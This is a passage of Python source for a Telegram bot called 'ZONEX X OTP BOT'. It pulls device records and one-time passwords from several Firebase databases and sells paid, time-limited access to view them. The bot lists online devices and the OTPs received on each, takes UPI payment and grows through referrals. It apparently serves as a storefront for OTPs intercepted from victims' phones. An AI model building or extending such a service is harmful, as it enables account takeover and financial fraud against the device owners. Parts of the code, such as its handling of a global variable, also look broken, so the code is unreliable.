def admin_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
         InlineKeyboardButton("👥 Users", callback_data="admin_users")],
        [InlineKeyboardButton("🔥 Firebase DBs", callback_data="admin_fb"),
         InlineKeyboardButton("💎 Plans", callback_data="admin_plans")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("💰 Payments", callback_data="admin_payments")],
        [InlineKeyboardButton("🔧 Maintenance", callback_data="admin_maint"),
         InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
    ])

# ─── Firebase management UI ─────────────────────────────────────────────────
def fb_list_kb() -> InlineKeyboardMarkup:
    rows = []
    for i, cfg in enumerate(data.get("firebase_configs", [])):
        status = fb_conn_status.get(cfg.get("label", ""), "?")
        icon = {"ok": "🟢", "err": "🔴"}.get(status, "⚪")
        dev_count = len(device_cache.get(cfg.get("label", ""), {}))
        rows.append([
            InlineKeyboardButton(
                f"{icon} {cfg.get('label','?')} ({dev_count})",
                callback_data=f"fb_view|{i}",
            )
        ])
    rows.append([InlineKeyboardButton("➕ Add New Firebase", callback_data="fb_add")])
    rows.append([InlineKeyboardButton("🔄 Refresh All", callback_data="fb_refresh_all")])
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def fb_view_kb(idx: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✏️ Edit URL", callback_data=f"fb_edit_url|{idx}"),
         InlineKeyboardButton("🔑 Edit Key", callback_data=f"fb_edit_key|{idx}")],
        [InlineKeyboardButton("🏷 Edit Label", callback_data=f"fb_edit_label|{idx}"),
         InlineKeyboardButton("🧪 Test", callback_data=f"fb_test|{idx}")],
        [InlineKeyboardButton("🗑 Delete", callback_data=f"fb_del|{idx}")],
        [InlineKeyboardButton("⬅️ Back", callback_data="admin_fb")],
    ])

# ─── Callback router ─────────────────────────────────────────────────────────
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    user = update.effective_user
    uid = user.id
    d = q.data

    if d == "noop": return

    if d == "check_join":
        ok, missing = await check_channels(ctx.bot, uid)
        if ok:
            data["users"][str(uid)]["channels_done"] = True
            save_data(data)
            await q.edit_message_text("✅ Channels joined!\nAb /verify <KEY> ya /start dabao.")
        else:
            await q.edit_message_text(
                "❌ Abhi bhi missing:\n" + "\n".join(f"• {CH_NAMES.get(c,c)}" for c in missing),
                reply_markup=kb_channels(missing),
            )
        return

    # ---- Gate checks for non-admin content ----
    if d.startswith("admin") and not is_admin(uid):
        return await q.edit_message_text("❌ Admin only.")

    if d == "back_main":
        await q.edit_message_text(
            welcome_text(uid, user.first_name or "User"),
            reply_markup=main_menu_kb(uid),
            parse_mode="HTML",
        )
        return

    if d == "admin_panel":
        if not is_admin(uid): return
        await q.edit_message_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "🛠 𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=admin_kb(),
            parse_mode="HTML",
        )
        return

    # ---- Firebase admin ----
    if d == "admin_fb":
        if not is_admin(uid): return
        await q.edit_message_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "🔥 𝐅𝐈𝐑𝐄𝐁𝐀𝐒𝐄 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐒\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            "Apni Firebase databases manage karo.\n"
            "Har DB ka status aur device count yahaan.",
            reply_markup=fb_list_kb(),
            parse_mode="HTML",
        )
        return

    if d.startswith("fb_view|"):
        if not is_admin(uid): return
        idx = int(d.split("|")[1])
        cfgs = data.get("firebase_configs", [])
        if idx >= len(cfgs): return
        cfg = cfgs[idx]
        label = cfg.get("label", "?")
        status = fb_conn_status.get(label, "?")
        icon = {"ok": "🟢 Connected", "err": "🔴 Error"}.get(status, "⚪ Untested")
        dev_count = len(device_cache.get(label, {}))
        masked = cfg.get("url", "")
        if len(masked) > 55:
            masked = masked[:55] + "..."
        key_mask = "✅ set" if cfg.get("key") else "❌ empty"
        await q.edit_message_text(
            f"🔥 𝐅𝐈𝐑𝐄𝐁𝐀𝐒𝐄: {label}\n\n"
            f"📡 Status: {icon}\n"
            f"📱 Devices: {dev_count}\n"
            f"🌐 URL:\n`{masked}`\n\n"
            f"🔑 Key: {key_mask}",
            reply_markup=fb_view_kb(idx),
            parse_mode="Markdown",
        )
        return

    if d.startswith("fb_del|"):
        if not is_admin(uid): return
        idx = int(d.split("|")[1])
        cfgs = data.get("firebase_configs", [])
        if 0 <= idx < len(cfgs):
            removed = cfgs.pop(idx)
            data["firebase_configs"] = cfgs
            save_data(data)
            device_cache.pop(removed.get("label",""), None)
            otp_cache.pop(removed.get("label",""), None)
        await q.edit_message_text(
            "🗑 Deleted.\n\n" + "🔥 𝐅𝐈𝐑𝐄𝐁𝐀𝐒𝐄 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐒",
            reply_markup=fb_list_kb(),
        )
        return

    if d == "fb_add":
        if not is_admin(uid): return
        await q.edit_message_text("🌐 Firebase URL bhejo (e.g. https://xxx-default-rtdb.firebaseio.com):")
        return WAIT_FB_URL

    if d.startswith("fb_test|"):
        if not is_admin(uid): return
        idx = int(d.split("|")[1])
        cfgs = data.get("firebase_configs", [])
        if idx >= len(cfgs): return
        cfg = cfgs[idx]
        await q.edit_message_text("🧪 Testing...")
        try:
            await refresh_firebase(cfg)
            devs = device_cache.get(cfg["label"], {})
            status = fb_conn_status.get(cfg["label"], "?")
            await q.edit_message_text(
                f"🧪 Test: {cfg['label']}\n"
                f"Status: {status}\nDevices: {len(devs)}",
                reply_markup=fb_view_kb(idx),
            )
        except Exception as e:
            await q.edit_message_text(f"❌ Test error: {e}", reply_markup=fb_view_kb(idx))
        return

    if d == "fb_refresh_all":
        if not is_admin(uid): return
        await q.edit_message_text("🔄 Refreshing all databases...")
        await refresh_all_firebases()
        global last_refresh
        last_refresh = now_dt().strftime("%H:%M:%S")
        await q.edit_message_text(
            "✅ All refreshed.",
            reply_markup=fb_list_kb(),
        )
        return

    # ---- Admin stats / users / plans / broadcast ----
    if d == "admin_stats":
        if not is_admin(uid): return
        users = data["users"]
        total = len(users)
        active = sum(1 for u in users.values() if u.get("expires_at") and
                     datetime.strptime(u["expires_at"], "%Y-%m-%d %H:%M:%S") > now_dt())
        banned = sum(1 for u in users.values() if u.get("banned"))
        await q.edit_message_text(
            f"📊 𝐒𝐓𝐀𝐓𝐒\n\n"
            f"👥 Users: {total}\n"
            f"🟢 Active: {active}\n"
            f"🚫 Banned: {banned}\n"
            f"🔥 DBs: {len(data.get('firebase_configs',[]))}\n"
            f"📱 Devices: {len(get_all_devices())}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]),
        )
        return

    if d == "admin_broadcast":
        if not is_admin(uid): return
        await q.edit_message_text("📢 Broadcast message bhejo:")
        return WAIT_BROADCAST

    if d == "admin_maint":
        if not is_admin(uid): return
        data["maintenance"] = not data.get("maintenance", False)
        save_data(data)
        state = "ON 🚧" if data["maintenance"] else "OFF ✅"
        await q.edit_message_text(
            f"🔧 Maintenance: {state}",
            reply_markup=admin_kb(),
        )
        return

    if d == "admin_payments":
        if not is_admin(uid): return
        await q.edit_message_text(
            f"💰 UPI: `{data.get('upi_id') or 'not set'}`\n"
            f"QR: {'✅ set' if data.get('qr_file_id') else '❌ not set'}\n"
            f"Pending: {len(data.get('pending_payments', {}))}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✏️ Set UPI", callback_data="set_upi")],
                [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")],
            ]),
        )
        return

    if d == "admin_plans":
        if not is_admin(uid): return
        plans = data.get("pricing_plans", [])
        lines = ["💎 𝐏𝐋𝐀𝐍𝐒\n"]
        for p in plans:
            lines.append(f"• {p['label']} — ₹{p['price']} ({p['hours']}h)")
        await q.edit_message_text(
            "\n".join(lines),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]),
        )
        return

    if d == "admin_users":
        if not is_admin(uid): return
        users = data["users"]
        lines = [f"👥 Total: {len(users)}\n"]
        for i, (u_id, u) in enumerate(list(users.items())[:20], 1):
            name = u.get("name","?")
            ban = "🚫" if u.get("banned") else "✅"
            lines.append(f"{i}. {ban} {name} (`{u_id}`)")
        if len(users) > 20:
            lines.append(f"\n...+{len(users)-20} more")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]),
        )
        return

    # ---- User-facing flows ----
    if d == "refresh":
        await q.edit_message_text("🔄 Refreshing...")
        await refresh_all_firebases()
        global last_refresh
        last_refresh = now_dt().strftime("%H:%M:%S")
        await q.edit_message_text(
            welcome_text(uid, user.first_name or "User"),
            reply_markup=main_menu_kb(uid),
            parse_mode="HTML",
        )
        return

    if d == "refresh_devices":
        if not has_access(uid):
            await q.edit_message_text(expired_text(user.first_name or "User"), reply_markup=expired_kb())
            return
        await refresh_all_firebases()
        last_refresh = now_dt().strftime("%H:%M:%S")
        await q.edit_message_text(
            devices_text(online_only=False),
            reply_markup=devices_kb(online_only=False),
            parse_mode="HTML",
        )
        return

    if d == "devices_online":
        if not has_access(uid):
            await q.edit_message_text(expired_text(user.first_name or "User"), reply_markup=expired_kb())
            return
        await q.edit_message_text(
            devices_text(online_only=True),
            reply_markup=devices_kb(online_only=True),
            parse_mode="HTML",
        )
        return

    if d == "devices_all":
        if not has_access(uid):
            await q.edit_message_text(expired_text(user.first_name or "User"), reply_markup=expired_kb())
            return
        await q.edit_message_text(
            devices_text(online_only=False),
            reply_markup=devices_kb(online_only=False),
            parse_mode="HTML",
        )
        return

    if d.startswith("dev|"):
        if not has_access(uid):
            await q.edit_message_text(expired_text(user.first_name or "User"), reply_markup=expired_kb())
            return
        parts = d.split("|")
        label = parts[1]
        dev_id = parts[2]
        dev = device_cache.get(label, {}).get(dev_id)
        if not dev:
            await q.edit_message_text("❌ Device not found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="refresh_devices")]]))
            return
        otps = get_otps_for(dev_id, label)
        await q.edit_message_text(
            device_info_text(dev, otps),
            reply_markup=device_info_kb(label, dev_id, otps),
            parse_mode="HTML",
        )
        return

    if d == "profile":
        u = data["users"].get(str(uid), {})
        await q.edit_message_text(
            f"👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄\n\n"
            f"Name: {u.get('name','?')}\n"
            f"ID: `{uid}`\n"
            f"Key: `{u.get('key','?')}`\n"
            f"Verified: {'✅' if u.get('key_verified') else '❌'}\n"
            f"Access: {time_left_detailed(uid)}\n"
            f"Referrals: {u.get('referral_count',0)}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]),
        )
        return

    if d == "refer":
        link = f"https://t.me/{(await ctx.bot.get_me()).username}?start={uid}"
        await q.edit_message_text(
            f"🎁 𝐑𝐄𝐅𝐄𝐑 & 𝐄𝐀𝐑𝐍\n\n"
            f"Har referral par +{get_referral_hours():g} hour FREE!\n\n"
            f"🔗 `{link}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={link}")],
                [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
            ]),
        )
        return

    if d == "buy_menu":
        plans = data.get("pricing_plans", [])
        rows = []
        for p in plans:
            rows.append([InlineKeyboardButton(f"{p['label']} — ₹{p['price']}", callback_data=f"buy|{p['id']}")])
        rows.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
        await q.edit_message_text(
            "💎 𝐁𝐔𝐘 𝐏𝐋𝐀𝐍\n\nApna plan choose karo:",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return

    if d.startswith("buy|"):
        pid = d.split("|")[1]
        plan = next((p for p in data.get("pricing_plans", []) if p["id"] == pid), None)
        if not plan:
            return
        await q.edit_message_text(
            f"💎 {plan['label']}\n"
            f"💰 Price: ₹{plan['price']}\n"
            f"⏱ Duration: {plan['hours']}h\n\n"
            f"Payment ke liye admin se contact karo:\n{ADMIN_USERNAME}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📞 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
                [InlineKeyboardButton("⬅️ Back", callback_data="buy_menu")],
            ]),
        )
        return

# ─── Conversation handlers (Firebase add / edit) ────────────────────────────
async def fb_add_url(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid URL. Dobara bhejo:")
        return WAIT_FB_URL
    ctx.user_data["fb_url"] = url
    await update.message.reply_text("🏷 Label bhejo (e.g. Main DB):")
    return WAIT_FB_LABEL

async def fb_add_label(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    label = update.message.text.strip()
    ctx.user_data["fb_label"] = label
    await update.message.reply_text(
        "🔑 Auth key bhejo (optional, ya /skip likho):"
    )
    return WAIT_FB_KEY

async def fb_add_key(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text.strip()
    key = "" if txt.lower() == "/skip" else txt
    cfg = {
        "url":   ctx.user_data.pop("fb_url"),
        "label": ctx.user_data.pop("fb_label"),
        "key":   key,
    }
    data.setdefault("firebase_configs", []).append(cfg)
    save_data(data)
    await update.message.reply_text(
        f"✅ Firebase added: {cfg['label']}",
        reply_markup=fb_list_kb(),
    )
    return ConversationHandler.END

async def fb_add_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

async def broadcast_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    sent = 0
    for u_id in data["users"]:
        try:
            await ctx.bot.send_message(int(u_id), text)
            sent += 1
        except: pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")
    return ConversationHandler.END

async def set_upi_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    data["upi_id"] = text
    save_data(data)
    await update.message.reply_text(f"✅ UPI set: {text}", reply_markup=admin_kb())
    return ConversationHandler.END

# ─── Auto-refresh loop ────────────────────────────────────────────────────────
async def auto_refresh_loop(app: Application):
    global last_refresh
    while True:
        try:
            await asyncio.sleep(AUTO_REFRESH)
            await refresh_all_firebases()
            last_refresh = now_dt().strftime("%H:%M:%S")
        except Exception as e:
            logger.warning(f"auto_refresh: {e}")

# ─── Startup ─────────────────────────────────────────────────────────────────
async def post_init(app: Application):
    await _sync_from_firebase_on_startup()
    await refresh_all_firebases()
    last_refresh = now_dt().strftime("%H:%M:%S")
    app.create_task(auto_refresh_loop(app))

def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set")
        return
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    # Conversation for firebase add
    fb_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(lambda u, c: WAIT_FB_URL, pattern="^fb_add$")],
        states={
            WAIT_FB_URL:   [MessageHandler(filters.TEXT & ~filters.COMMAND, fb_add_url)],
            WAIT_FB_LABEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, fb_add_label)],
            WAIT_FB_KEY:   [MessageHandler(filters.TEXT & ~filters.COMMAND, fb_add_key),
                            CommandHandler("skip", fb_add_key)],
        },
        fallbacks=[CommandHandler("cancel", fb_add_cancel)],
    )

    # Broadcast conversation
    bc_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(lambda u, c: WAIT_BROADCAST, pattern="^admin_broadcast$")],
        states={
            WAIT_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_send)],
        },
        fallbacks=[CommandHandler("cancel", fb_add_cancel)],
    )

    # UPI conversation
    upi_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(lambda u, c: WAIT_KEY, pattern="^set_upi$")],
        states={
            WAIT_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_upi_handler)],
        },
        fallbacks=[CommandHandler("cancel", fb_add_cancel)],
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("verify", cmd_verify))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(fb_conv)
    app.add_handler(bc_conv)
    app.add_handler(upi_conv)
    app.add_handler(CallbackQueryHandler(on_callback))

    logger.info("🚀 ZONEX X OTP BOT v4.7 starting...")
    app.run_polling(drop_pending_updates=True, close_loop=False)

if __name__ == "__main__":
    main()
